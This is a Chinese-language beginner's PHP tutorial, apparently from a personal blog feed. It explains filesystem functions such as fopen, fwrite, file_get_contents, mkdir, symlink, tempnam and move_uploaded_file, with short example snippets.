class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>); <span class="comment">// 操作完成后释放资源</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><h2 id="4-目录操作"><a href="#4-目录操作" class="headerlink" title="4. 目录操作"></a>4. 目录操作</h2><ol><li><p><code>mkdir($dir, $mode)</code></p><ul><li><p>该函数用来创建目录，<code>$dir</code>参数表示要创建的目录路径，<code>$mode</code>参数表示目录权限，，默认为 <code>0777</code>（最大权限）。他的返回值为布尔值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;/php/newFolder&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建目录（使用默认权限 0777）</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;目录 &#x27;<span class="subst">&#123;$dir&#125;</span>&#x27; 创建成功！&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;创建目录失败！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>rmdir($dir)</code></p><ul><li>该函数用来删除目录<code>rmdir(&quot;/php/newFolder&quot;)</code></li></ul></li><li><p><code>glob($pattern)</code></p><ul><li><p>该函数用来匹配文件或者目录。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">glob</span>(<span class="string">&quot;*.txt&quot;</span>))</span><br></pre></td></tr></table></figure></li></ul></li></ol><h2 id="5-连接处理"><a href="#5-连接处理" class="headerlink" title="5. 连接处理"></a>5. 连接处理</h2><ol><li><p><code>symlink($target, $link)</code></p><ul><li>该函数的作用是：创建符号链接（软连接），它的返回值为布尔类型。</li></ul><ul><li><p>其中参数<code>$target</code>表示的是源文件或者目录的真实路径（即软连接所指向的位置）。参数<code>$link</code>表示的是要创建的符号连接路径。</p></li><li><p><strong>特点：</strong> 1. 符号链接类似 Windows 的“快捷方式”。 2. 如果 <code>$target</code> 被删除，链接会失效（称为“断链”）。 3. 支持跨文件系统和指向目录。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建指向 /var/www/file.txt 的软链接</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">symlink</span>(<span class="string">&#x27;/var/www/file.txt&#x27;</span>, <span class="string">&#x27;shortcut.ln&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;符号链接创建成功！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 访问 shortcut.ln 会读取 /var/www/file.txt 的内容</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>link($target, $link)</code></p><ul><li><p>该函数的作用是：创建硬链接，它的返回值也为布尔类型。</p></li><li><p>其中参数<code>$target</code>表示已存在的源文件路径（不可以是目录）。参数<code>$link</code>表示要创建的硬链接路径。</p></li><li><p><strong>特点：</strong> 1. 硬链接是原始文件的副本引用（指向同一个 <code>inode</code>）。 2. 删除 <code>$target</code> 后，文件内容仍可通过硬链接访问。 3. 不支持跨文件系统或目录 4. 所有硬链接地位平等，没有主从之分。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 为 /home/user/data.txt 创建硬链接</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">link</span>(<span class="string">&#x27;/home/user/data.txt&#x27;</span>, <span class="string">&#x27;backup.dat&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;硬链接创建成功！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 修改 backup.dat 会同步修改 data.txt</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>readlink($link)</code></p><ul><li>读取链接目标：<code>echo readlink(&quot;backup.dat&quot;)</code></li></ul></li></ol><h2 id="6-磁盘信息"><a href="#6-磁盘信息" class="headerlink" title="6. 磁盘信息"></a>6. 磁盘信息</h2><ol><li><p><code>disk_free_space($path)</code></p><ul><li><p>用来读取磁盘剩余空间。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">disk_free_space</span>(<span class="string">&quot;/&quot;</span>) <span class="comment">// 当前php文件所在磁盘可用大小</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">disk_free_space</span>(<span class="string">&quot;G:/&quot;</span>) <span class="comment">// G磁盘剩余储蓄空间可用大小</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>disk_total_space($path)</code></p><ul><li><p>用来读取磁盘总空间。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">disk_total_space</span>(<span class="string">&quot;/&quot;</span>) <span class="comment">// 当前php文件所在磁盘总大小</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">disk_total_space</span>(<span class="string">&quot;G:/&quot;</span>) <span class="comment">// G磁盘剩余储蓄空间总大小</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><h2 id="7-临时文件"><a href="#7-临时文件" class="headerlink" title="7. 临时文件"></a>7. 临时文件</h2><ol><li><p><code>tmpfile()</code></p><ul><li><p>创建一个<strong>自动删除</strong>的临时文件，文件关闭后或脚本结束时自动销毁。</p></li><li><p><strong>特点</strong>：</p><ul><li>返回一个文件句柄（资源类型），不可直接访问文件路径</li><li>文件存储在系统默认临时目录（如 Linux 的 <code>/tmp</code>）</li><li>无需手动清理，适合短期临时操作</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$temp</span> = <span class="title function_ invoke__">tmpfile</span>();     <span class="comment">// 创建临时文件（返回资源）</span></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$temp</span>, <span class="string">&quot;Test&quot;</span>); <span class="comment">// 写入数据</span></span><br><span class="line"><span class="comment">// ...其他操作...</span></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$temp</span>);         <span class="comment">// 关闭文件 → 自动删除</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>tempnam($dir, $prefix)</code></p><ul><li><p>生成一个<strong>唯一的临时文件名</strong>（不创建文件），需手动管理删除。</p></li><li><p><strong>参数</strong>：</p><ul><li><code>$dir</code>：指定目录（若目录无效则使用系统临时目录）</li><li><code>$prefix</code>：文件名前缀（如 <code>&quot;TMP&quot;</code> 会生成 <code>TMPxxxxx</code>）</li></ul></li><li><p><strong>特点</strong>：</p><ul><li><p>返回文件路径的字符串</p></li><li><p>需手动用 <code>unlink()</code> 删除文件</p></li><li><p>需配合 <code>fopen()</code> 等函数操作文件</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$path</span> = <span class="title function_ invoke__">tempnam</span>(<span class="string">&quot;/tmp&quot;</span>, <span class="string">&quot;TMP&quot;</span>); <span class="comment">// 生成路径如 &quot;/tmp/TMPaBc123&quot;</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>, <span class="string">&quot;w+&quot;</span>);     <span class="comment">// 创建文件</span></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="string">&quot;Test&quot;</span>);          <span class="comment">// 写入数据</span></span><br><span class="line"><span class="comment">// ...其他操作...</span></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);                  <span class="comment">// 关闭文件</span></span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="variable">$path</span>);                  <span class="comment">// 手动删除文件！⚠️</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><h2 id="8-文件权限检查"><a href="#8-文件权限检查" class="headerlink" title="8. 文件权限检查"></a>8. 文件权限检查</h2><ol><li><code>is_readable($file)</code> &#x2F; <code>is_writable($file)</code><ul><li>检查可读性：<code>is_readable(&quot;test.txt&quot;)</code>，返回<code>0</code>或<code>1</code>。</li><li>检查可写性：<code>is_writable(&quot;test.txt&quot;)</code>，返回<code>0</code>或<code>1</code>。</li></ul></li><li><code>fileperms($file)</code><ul><li>获取权限值：<code>echo decoct(fileperms(&quot;test.txt&quot;))</code>（八进制）<ul><li>其中<code>decoat()</code>函数用来将十进制数字转化为八进制。</li><li>例如：输出为<code>100644</code>实际表示的权限为0644。输出为<code>100664</code>实际表示的权限为0664。</li></ul></li></ul></li></ol><h2 id="9-其他关键函数"><a href="#9-其他关键函数" class="headerlink" title="9. 其他关键函数"></a>9. 其他关键函数</h2><ol><li><p><code>parse_ini_file($file)</code></p><ul><li>用于解析 INI 配置文件并返回关联数组，用于读取 PHP 配置信息。</li><li><strong>参数：</strong><ul><li><code>$file</code>：INI 文件路径。</li><li><code>$process_sections</code>（可选）：<ul><li><code>true</code> → 返回多维数组（带节分组）。</li><li><code>false</code> → 返回单维数组（默认）。</li></ul></li></ul></li></ul></li><li><p><code>。realpath($path</code></p><ul><li>返回绝对路径：<code>echo realpath(&quot;test.txt&quot;)</code></li></ul></li><li><p><code>move_uploaded_file($tmp, $dest)</code></p><ul><li><p>安全移动上传的临时文件到新位置，专门用于处理 HTTP 文件上传。</p></li><li><p><strong>参数：</strong></p><ul><li><code>$tmp</code>：上传文件的临时路径（来自 <code>$_FILES[&#39;field&#39;][&#39;tmp_name&#39;]</code>）。</li><li><code>$dest</code>：目标路径（包含文件名）。</li></ul></li><li><p><strong>关键特性</strong>：</p><ul><li>安全检查：验证 <code>$tmp</code> 是否为合法上传文件（防止伪造路径攻击）。</li><li>覆盖行为：若目标文件存在，​自动覆盖​（无警告）。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;uploads/file.txt&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP基础入门（三）</title>
      <link href="/2025/07/16/PHP%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2025/07/16/PHP%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP基础入门（三）"><a href="#PHP基础入门（三）" class="headerlink" title="PHP基础入门（三）"></a>PHP基础入门（三）</h1><blockquote><p>[!NOTE]</p><p>本篇文章仅用于个人交流与学习，如涉及侵权请联系站长删除！</p></blockquote><p>​本篇文章来介绍PHP文件系统操作函数的核心用法的第一部分！</p><h2 id="1-文件路径处理"><a href="#1-文件路径处理" class="headerlink" title="1. 文件路径处理"></a>1. 文件路径处理</h2><ol><li><p><code>basename($path, $suffix)</code></p><ul><li><p>返回路径中的文件名部分，参数<code>$path</code>为路径，可以通过参数<code>$suffix</code>来去掉文件的扩展名。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$oneName</span> = <span class="title function_ invoke__">basename</span>(<span class="string">&quot;/testweb/home.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$oneName</span>; <span class="comment">//输出为 home.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$twoName</span> = <span class="title function_ invoke__">basename</span>(<span class="string">&quot;/testweb/home.php&quot;</span>, <span class="string">&quot;.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$twoName</span>; <span class="comment">//输出为 home</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>dirname($path, $levels)</code></p><ul><li><p>返回路径目录部分，参数<code>$path</code>为路径，可以通过参数<code>$levels</code>指定向上返回的目录层级数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$oneName</span> = <span class="title function_ invoke__">dirname</span>(<span class="string">&quot;c:/testweb/home.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$oneName</span>; <span class="comment">//输出为 c:/testweb</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$twoName</span> = <span class="title function_ invoke__">dirname</span>(<span class="string">&quot;c:/testweb/home.php&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$twoName</span>; <span class="comment">//输出为 c:\</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>pathinfo($path)</code></p><ul><li><p>返回路径信息数组，包括返回路径（dirname），文件名（basename），后缀名（extension）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="string">&quot;/testweb/test.txt&quot;</span>)) </span><br><span class="line"><span class="comment">// 输出为Array ( [dirname] =&gt; testweb [basename] =&gt; test.txt [extension] =&gt; txt [filename] =&gt; test )</span></span><br></pre></td></tr></table></figure><p><strong>注意：</strong>因为这里要输出信息数组，所以要使用<code>print_r</code>输出。</p></li></ul></li></ol><h2 id="2-文件属性修改"><a href="#2-文件属性修改" class="headerlink" title="2. 文件属性修改"></a>2. 文件属性修改</h2><ol><li><p><code>chgrp($file, $group)</code></p><ul><li><p>修改文件所属组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">chgrp</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;www-data&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>chmod($file, $owner)</code></p><ul><li><p>修改文件权限（8进制模式）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">chmod</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="number">0664</span>);</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>这里的权限表示为所有者读写，其他人只读。</p></li></ul></li><li><p><code>chown($file, $owner)</code></p><ul><li><p>修改文件所有者。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">chown</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;gsy&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>touch($file, $time)</code></p><ul><li><p>修改访问&#x2F;修改时间（默认为当前时间）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">touch</span>(<span class="string">&quot;test.txt&quot;</span>);</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>文件存在则更新时间，文件不存在则创建。</p></li></ul></li></ol><h2 id="3-文件读写操作"><a href="#3-文件读写操作" class="headerlink" title="3.文件读写操作"></a>3.文件读写操作</h2><ol><li><p><code>fopen($file, $mode)</code></p><ul><li><p>打开文件，参数<code>$mode</code>则是以什么样的模式打开文件。</p><table><thead><tr><th align="center"><strong>模式</strong></th><th align="center"><strong>说明</strong></th></tr></thead><tbody><tr><td align="center"><code>r</code></td><td align="center">只读方式打开，将文件指针指向文件头。</td></tr><tr><td align="center"><code>r+</code></td><td align="center">读写方式打开，将文件指针指向文件头。</td></tr><tr><td align="center"><code>w</code></td><td align="center">写入方式打开，将文件指针指向文件头并将文件大小截为0，如果文件不存在则尝试创建。</td></tr><tr><td align="center"><code>w+</code></td><td align="center">读写方式打开，将文件指针指向文件头并将文件大小截为0，如果文件不存在则尝试创建。</td></tr><tr><td align="center"><code>a</code></td><td align="center">写入方式打开，将文件指针指向文件尾，如果文件不存在则尝试创建。</td></tr><tr><td align="center"><code>a+</code></td><td align="center">读写方式打开，将文件指针指向文件尾，如果文件不存在则尝试创建。</td></tr><tr><td align="center"><code>x</code></td><td align="center">创建并以写入方式打开，将文件指针指向文件头。如果文件已经存在，则<code>fopen()</code>调用失败并返回<code>FALSE</code>，并生成一条 E_WARNING 级别的报错信息。如果文件不存在则尝试创建。</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fopen</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;G:/phpCode/test.txt&#x27;</span>, <span class="string">&quot;r&quot;</span>); <span class="comment">// 以只读模式打开文件</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$fopen</span>);<span class="comment">// 使用var_dump()操作一下$fopen看看效果，查看输出结果，提示resource</span></span><br></pre></td></tr></table></figure><p><strong>注意：</strong><code>fopen()</code>函数返回的仅仅一个指向文件的资源句柄，而非内容本身。</p></li></ul></li><li><p><code>fwrite($handle, $data)</code> 和 <code>fread($handle, $length)</code></p><ul><li><p><code>fwrite($handle, $data)</code>函数用于写入数据。<code>$handle</code>参数代表文件对象，而<code>$data</code>参数代表的是需要写入的数据，它的返回值是输入值字节数，并且如果需要写入的文档中已经有内容了，<code>fwrite()</code>函数会覆盖这些内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fopen</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;G:/phpCode/test.txt&#x27;</span>, <span class="string">&quot;w&quot;</span>); <span class="comment">// 以写入的方式打开文件。</span></span><br><span class="line"><span class="variable">$fwrite</span> = <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fopen</span>, <span class="string">&quot;fwrite()函数使用测试&quot;</span>); <span class="comment">// 调用函数fwrite()并将它赋值给变量 $fwrite。</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fopen</span>); <span class="comment">// 关闭文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$fwrite</span>; <span class="comment">// 打印$fwrite变量 输出为26</span></span><br></pre></td></tr></table></figure></li><li><p><code>fread($handle, $length)</code>返回所读取的字符串，如果出错返回 <code>FALSE</code>。<code>$handle</code>参数代表的是需要读取的文件对象，<code>$length</code>参数代表的是需要读取的字节长度。</p></li></ul>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;G:/phpCode/test.txt&#x27;</span>, <span class="string">&quot;r&quot;</span>); <span class="comment">// 用读的方式打开文件</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$handle</span>, <span class="number">100</span>); <span class="comment">// 用$str变量接受fread函数返回的字符串</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$str</span>; <span class="comment">// 打印字符串</span></span><br></pre></td></tr></table></figure></li><li><p><code>file_get_contents($file)</code> 和 <code>file_put_contents($file, $data)</code></p><ul><li><p><code>file_get_contents($file)</code>可以读取整个文件到字符串，它返回的值是字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;G:/phpCode/test.txt&#x27;</span>); <span class="comment">// 输出文件中内容</span></span><br></pre></td></tr></table></figure></li><li><p><code>file_put_contents($file, $data)</code>可以写入字符串到文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里的test.txt文件中的内容为123</span></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;G:/phpCode/test.txt&#x27;</span>, <span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>; <span class="comment">// 输出的内容为5</span></span><br></pre></td></tr></table></figure><p><strong>注意：</strong><code>file_put_contents($file, $data)</code>函数执行两个操作：</p><ol><li>覆盖写入文件，原本的txt文件中的内容<code>&#39;123&#39;</code>被替换为<code>hello</code>。</li><li>返回写入的字节数。</li></ol></li></ul></li><li><p><code>file($file)</code></p><ul><li><p><code>file($file)</code>函数可以读取整个函数到数组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*原本txt文档中的内容为：</span></span><br><span class="line"><span class="comment">abc</span></span><br><span class="line"><span class="comment">def</span></span><br><span class="line"><span class="comment">ghi</span></span><br><span class="line"><span class="comment">jkl</span></span><br><span class="line"><span class="comment">mno</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="string">&#x27;G:/phpCode/test.txt&#x27;</span>)); </span><br><span class="line"><span class="comment">// 输出的结果为：Array ( [0] =&gt; abc [1] =&gt; def [2] =&gt; ghi [3] =&gt; jkl [4] =&gt; mno )</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>fgets($handle)</code> 和 <code>fgetc($handle)</code></p><ul><li><p><code>fgets($handle)</code> 用来逐行读取文件内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 首先用 fopen() 打开文件</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;G:/phpCode/test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$line</span>; <span class="comment">// 输出第一行内容</span></span><br></pre></td></tr></table></figure></li><li><p><code>fgetc($handle)</code>用来逐字读取文件内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 首先用 fopen() 打开文件</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;G:/phpCode/test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$line</span>; <span class="comment">// 输出第一个单字符</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>注意事项</p><p>在文件读写操作所提到的这些函数中，有一个需要注意的地方是像：<code>fwrite($handle, $data)</code> 、<code>fread($handle, $length)</code>、 <code>fread($handle, $length)</code>、<code>fgets($handle)</code>、<code>fgetc($handle)</code>这样的函数，它们的参数使用的是文件资源（资源句柄<code>$handle</code>），所以在调用时，我们首先应该通过<code>fopen()</code>函数获得这样的资源句柄，才能保证顺利运行。</p></li></ol><h2 id="4-文件缓存状态"><a href="#4-文件缓存状态" class="headerlink" title="4. 文件缓存状态"></a>4. 文件缓存状态</h2><ol><li><p><code>clearstatcache()</code></p><ul><li><p>清除文件缓存状态（修改后需要调用）。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设原来txt文件里的内容为123</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;G:/phpCode/test.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;初始大小：&quot;</span> . <span class="title function_ invoke__">filesize</span>(<span class="variable">$file</span>) . <span class="string">&quot;字节&lt;br&gt;&quot;</span>; <span class="comment">// 初始大小输出为3。</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;添加一些内容&quot;</span>); <span class="comment">// 通过函数修改txt文件中的内容。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;不清理缓存：&quot;</span> . <span class="title function_ invoke__">filesize</span>(file) . <span class="string">&quot;字节&lt;br&gt;&quot;</span>; <span class="comment">// 没有调用clearstatcahe()函数时 继续输出3</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">clearstatcache</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;清理缓存后&quot;</span> . <span class="title function_ invoke__">filesize</span>(<span class="variable">$file</span>) . <span class="string">&quot;字节&lt;br&gt;&quot;</span> <span class="comment">// 清理缓存后输出的值为18</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>filesize($file)</code> 和 <code>filetype($file)</code></p><ul><li><p><code>filesize($file)</code>函数用来获取文件大小，并返回一个以字节为单位的大小数值，在刚刚的例子里也有体现。</p></li><li><p><code>filetype($file)</code>函数可以获取并返回文件类型，但是它返回的是文件在操作系统中的基本类型（也称为文件模式、文件种类），而不是后最格式或文件格式。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;G:/phpCode/test.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">filetype</span>(<span class="variable">$file</span>); <span class="comment">// 输出的结果为file</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>file_exists($file)</code>、<code>is_file($file)</code>和<code>is_dir($file)</code></p><ul><li><p><code>file_exists($file)</code>函数用来查找检查文件或者目录是否存在。若存在则返回<code>TRUE</code>，若不存在则返回<code>FALSE</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;G:\phpCode\test.txt&#x27;</span>; <span class="comment">// 此文件存在</span></span><br><span class="line"><span class="variable">$iiii</span> = <span class="string">&#x27;G:\phpCode\abc.txt&#x27;</span>; <span class="comment">// 此文件不存在</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件存在&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件不存在&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span 